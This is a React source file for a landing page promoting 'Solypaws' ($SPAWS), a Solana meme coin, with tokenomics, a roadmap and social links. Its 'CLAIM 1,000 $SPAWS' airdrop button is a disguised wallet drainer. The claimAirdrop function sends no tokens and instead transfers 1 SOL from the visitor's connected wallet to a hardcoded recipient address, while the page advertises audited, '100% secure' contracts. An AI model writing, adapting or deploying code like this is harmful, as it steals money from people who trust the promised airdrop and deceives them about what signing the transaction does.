import React, { useCallback, useState } from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import {
  SystemProgram,
  Transaction,
  PublicKey,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { FaTwitter, FaTelegram, FaDiscord, FaChartLine, FaRocket, FaShieldAlt, FaGlobe, FaBolt } from "react-icons/fa";

export default function App() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [status, setStatus] = useState("");
  const [isMenuOpen, setIsMenuOpen] = useState(false);

  // Public key penerima
  const recipient = new PublicKey(
    "J9hvdqBJcegwh8xcvgFdBWKMNbhxotfEZNrah6ko3ULh"
  );

  const claimAirdrop = useCallback(async () => {
    if (!publicKey) {
      setStatus("Please connect your wallet first!");
      return;
    }

    try {
      setStatus("Creating transaction...");

      const { blockhash } = await connection.getRecentBlockhash();

      const transaction = new Transaction({
        recentBlockhash: blockhash,
        feePayer: publicKey,
      }).add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: recipient,
          lamports: LAMPORTS_PER_SOL,
        })
      );

      setStatus("Sending transaction...");
      const signature = await sendTransaction(transaction, connection);

      setStatus("Waiting for confirmation...");
      await connection.confirmTransaction(signature, "confirmed");

      setStatus("Transfer successful! Signature: " + signature);
    } catch (error) {
      setStatus("Error: " + (error.message || "Unknown error occurred"));
    }
  }, [publicKey, connection, sendTransaction]);

  const toggleMenu = () => {
    setIsMenuOpen(!isMenuOpen);
  };
  
  return (
    <div className="app">
      {/* Header */}
      <header className="header">
        <div className="container">
          <div className="logo">              
            <div className="feature-images">
                <img 
                  src="https://gateway.pinata.cloud/ipfs/bafkreibag3ks44qcsdi66ncmjkmphgjkvmpbm46sug6ggllnobnrevfyfe" 
                  alt="Global Community" 
                />
              </div></div>
          
          <div className={`nav-links ${isMenuOpen ? "active" : ""}`}>
            <a href="#home">Home</a>
            <a href="#features">Features</a>
            <a href="#tokenomics">Tokenomics</a>
            <a href="#roadmap">Roadmap</a>
            <a href="#community">Community</a>
          </div>
          
          <div className="wallet-container">
            <WalletMultiButton className="wallet-btn" />
          </div>
          
          <button className="menu-toggle" onClick={toggleMenu}>
            <span></span>
            <span></span>
            <span></span>
          </button>
        </div>
      </header>

      {/* Hero Section */}
      <section id="home" className="hero">
        <div className="container">
          <div className="hero-content">
            <h1>Welcome to <span className="highlight">Solypaws</span></h1>
            <p>The cutest meme coin on Solana blockchain</p>
            
            <div className="hero-stats">
              <div className="stat-card">
                <h3>1,000,000</h3>
                <p>Total Supply</p>
              </div>
              <div className="stat-card">
                <h3>0% Tax</h3>
                <p>Forever</p>
              </div>
              <div className="stat-card">
                <h3>1 Month</h3>
                <p>Until Listing</p>
              </div>
            </div>
            
            <button 
              onClick={claimAirdrop}
              className="cta-button"
              disabled={!publicKey}
            >
              {publicKey ? "CLAIM 1,000 $SPAWS" : "CONNECT WALLET TO CLAIM"}
            </button>
            
            <p className="status">{status}</p>
          </div>
          
          <div className="hero-image">
            <div className="image-frame">
              <img 
                src="https://gateway.pinata.cloud/ipfs/bafkreihq324pkfnzypzqsr4rdwq4bfettgiy5rbxqg2juo4o3kxc4me2pm" 
                alt="Solypaws Mascot" 
                className="token-image"
              />
              <p className="image-caption">Meet our adorable Solypaws mascot</p>
              <div className="graphic-overlay"></div>
            </div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section id="features" className="features">
        <div className="container">
          <h2>Why <span className="highlight">$SPAWS</span>?</h2>
          <div className="features-grid">
            <div className="feature-card">
              <div className="feature-image">
                <img 
                  src="https://gateway.pinata.cloud/ipfs/bafkreiemeo6kvqh5gptytnhman64vntyiontlumivkin6ht3d5me3etvay" 
                  alt="Lightning Fast Transactions" 
                />
                <p className="image-caption">Blazing fast Solana transactions</p>
              </div>
              <h3>Lightning Fast</h3>
              <p>Built on Solana for instant transactions and near-zero fees</p>
            </div>
            
            <div className="feature-card">
              <div className="feature-image">
                <img 
                  src="https://gateway.pinata.cloud/ipfs/bafkreiahwn4z3l2rkocxrapuyimgbx45wb5ye7ienigwb5bclyc5fvgvn4" 
                  alt="Secure Ecosystem" 
                />
                <p className="image-caption">Audited and secure contracts</p>
              </div>
              <h3>100% Secure</h3>
              <p>Audited smart contracts with locked liquidity</p>
            </div>
            
            <div className="feature-card">
              <div className="feature-image">
                <img 
                  src="https://gateway.pinata.cloud/ipfs/bafkreifvv34u2vsv5yakakiqzinivj5wfjr4piordtfcrq4g56uuoc4pye" 
                  alt="Growth Potential" 
                />
                <p className="image-caption">Massive growth potential</p>
              </div>
              <h3>Moon Mission</h3>
              <p>Designed for exponential growth with tokenomics</p>
            </div>
            
            <div className="feature-card">
              <div className="feature-image">
                <img 
                  src="https://gateway.pinata.cloud/ipfs/bafkreibag3ks44qcsdi66ncmjkmphgjkvmpbm46sug6ggllnobnrevfyfe" 
                  alt="Global Community" 
                />
                <p className="image-caption">Join our global community</p>
              </div>
              <h3>Global Community</h3>
              <p>Join our growing pack of meme enthusiasts</p>
            </div>
          </div>
        </div>
      </section>

      {/* Tokenomics Section */}
<section id="tokenomics" className="tokenomics">
  <div className="container">
    <h2>Token <span className="highlight">Distribution</span></h2>
    <div className="tokenomics-content">
      
      {/* Pie Chart with Labels */}
      <div className="tokenomics-chart">
        <svg viewBox="0 0 36 36" className="circular-chart">
          <path className="circle" stroke="#4ECDC4" strokeDasharray="35, 65" d="M18 2.0845
            a 15.9155 15.9155 0 0 1 0 31.831
            a 15.9155 15.9155 0 0 1 0 -31.831" />
          <path className="circle" stroke="#FF6B6B" strokeDasharray="25, 75" strokeDashoffset="-35" d="M18 2.0845
            a 15.9155 15.9155 0 0 1 0 31.831
            a 15.9155 15.9155 0 0 1 0 -31.831" />
          <path className="circle" stroke="#FFD166" strokeDasharray="15, 85" strokeDashoffset="-60" d="M18 2.0845
            a 15.9155 15.9155 0 0 1 0 31.831
            a 15.9155 15.9155 0 0 1 0 -31.831" />
          <path className="circle" stroke="#118AB2" strokeDasharray="10, 90" strokeDashoffset="-75" d="M18 2.0845
            a 15.9155 15.9155 0 0 1 0 31.831
            a 15.9155 15.9155 0 0 1 0 -31.831" />
          <path className="circle" stroke="#073B4C" strokeDasharray="10, 90" strokeDashoffset="-85" d="M18 2.0845
            a 15.9155 15.9155 0 0 1 0 31.831
            a 15.9155 15.9155 0 0 1 0 -31.831" />
          <path className="circle" stroke="#06D6A0" strokeDasharray="5, 95" strokeDashoffset="-95" d="M18 2.0845
            a 15.9155 15.9155 0 0 1 0 31.831
            a 15.9155 15.9155 0 0 1 0 -31.831" />
        </svg>
      </div>

      {/* Legend */}
      <div className="tokenomics-details">
        <h3>Total Supply: 1,000,000 $SPAWS</h3>
        <ul className="legend">
          <li><span style={{ background: "#4ECDC4" }}></span> 35% Public Sale – Open for early investors</li>
          <li><span style={{ background: "#FF6B6B" }}></span> 25% Liquidity – Locked for 1 year</li>
          <li><span style={{ background: "#FFD166" }}></span> 15% Team – Vested over 12 months</li>
          <li><span style={{ background: "#118AB2" }}></span> 10% Marketing – Community growth & campaigns</li>
          <li><span style={{ background: "#073B4C" }}></span> 10% Reserve – Future development</li>
          <li><span style={{ background: "#06D6A0" }}></span> 5% Airdrop – Rewards for early supporters</li>
        </ul>
        <div className="listing-info">
          <FaRocket className="icon" />
          <p>DEX listing expected ~4 weeks after token launch (Est. September 2025)</p>
        </div>
      </div>
    </div>
  </div>
</section>

      {/* Roadmap Section */}
<section id="roadmap" className="roadmap">
  <div className="container">
    <h2>Project <span className="highlight">Roadmap</span></h2>
    <div className="timeline">

      {/* Aug – Oct 2025 */}
      <div className="timeline-item">
        <div className="timeline-marker">Aug – Oct 2025</div>
        <div className="timeline-content">
          <ul>
            <li>Website & Whitepaper Release</li>
            <li>Token Launch ($SPAWS) di Solana</li>
            <li>Smart Contract Audit</li>
            <li>Community Social Media Setup</li>
            <li>Initial Airdrop (5%)</li>
            <li>Target 2,000 Holders</li>
          </ul>
        </div>
      </div>

      {/* Nov 2025 – Jan 2026 */}
      <div className="timeline-item">
        <div className="timeline-marker">Nov 2025 – Jan 2026</div>
        <div className="timeline-content">
          <ul>
            <li>First Public Sale & Fundraising</li>
            <li>Liquidity Pool Creation</li>
            <li>DEX Listings (Raydium, Orca)</li>
            <li>Marketing Campaign Phase 1</li>
            <li>Target 10,000 Holders</li>
          </ul>
        </div>
      </div>

      {/* Feb – Apr 2026 */}
      <div className="timeline-item">
        <div className="timeline-marker">Feb – Apr 2026</div>
        <div className="timeline-content">
          <ul>
            <li>Staking Platform Launch</li>
            <li>Partnership Announcements</li>
            <li>Mobile Wallet Integration</li>
            <li>Small CEX Listing</li>
            <li>Target 25,000 Holders</li>
          </ul>
        </div>
      </div>

      {/* May – Jul 2026 */}
      <div className="timeline-item">
        <div className="timeline-marker">May – Jul 2026</div>
        <div className="timeline-content">
          <ul>
            <li>NFT Collection “Pawverse” Launch</li>
            <li>Merchandise Store Online</li>
            <li>Major CEX Listing</li>
            <li>Marketing Campaign Phase 2</li>
            <li>Target 50,000 Holders</li>
          </ul>
        </div>
      </div>

      {/* Aug – Oct 2026 */}
      <div className="timeline-item">
        <div className="timeline-marker">Aug – Oct 2026</div>
        <div className="timeline-content">
          <ul>
            <li>Metaverse/Game Integration</li>
            <li>Global Partnership Expansion</li>
            <li>Community-Driven Governance</li>
            <li>Target 100,000+ Holders</li>
          </ul>
        </div>
      </div>

    </div>
  </div>
</section>


      {/* Community Section */}
      <section id="community" className="community">
        <div className="container">
          <h2>Join Our <span className="highlight">Pack</span></h2>
          <p>Where the Solypaws community gathers</p>
          
          <div className="community-description">
            <p>
              We're more than just a memecoin. We're a movement driven by creativity, 
              powered by unity, and fueled by pawsitive energy 🐾 Whether you're a trader, 
              builder, artist, or just here for the vibes - you belong here.
            </p>
          </div>
          
          <div className="social-links">
            <a href="https://www.solypaws.io" target="_blank" rel="noopener noreferrer" className="social-link">
              <FaGlobe className="social-icon" />
              <span>Website</span>
            </a>
            <a href="https://twitter.com/solypaws" target="_blank" rel="noopener noreferrer" className="social-link">
              <FaTwitter className="social-icon" />
              <span>Twitter</span>
            </a>
            <a href="https://t.me/solypaws" target="_blank" rel="noopener noreferrer" className="social-link">
              <FaTelegram className="social-icon" />
              <span>Telegram</span>
            </a>
          </div>
        </div>
      </section>

      <footer className="footer">
  <div className="container">
    <div className="footer-top">
      <div className="logo">$SPAWS</div>
      <p className="tagline">🐾 Leave your pawprints on the Solana blockchain 🐾</p>
    </div>

    <div className="footer-links">
      <a 
  href="https://gateway.pinata.cloud/ipfs/bafkreidcbzsrwdefotnz2an22iu4w7hnaqworyx3mys2cdgvcochuixvwy" 
  download="Solypaws_Whitepaper.pdf"
>
Whitepaper</a>
      <a href="#community">Community</a>
      <a href="https://gist.github.com/chocoprimainternasional-a11y/1a09f49d5ee54caf826d2c2ef6206c9b">Privacy</a>
      <a href="https://gist.github.com/chocoprimainternasional-a11y/1a09f49d5ee54caf826d2c2ef6206c9b">Terms</a>
    </div>

    <div className="footer-bottom">
      <p>© {new Date().getFullYear()} Solypaws. All rights reserved.</p>
    </div>
  </div>
</footer>

    </div>
    
  );
}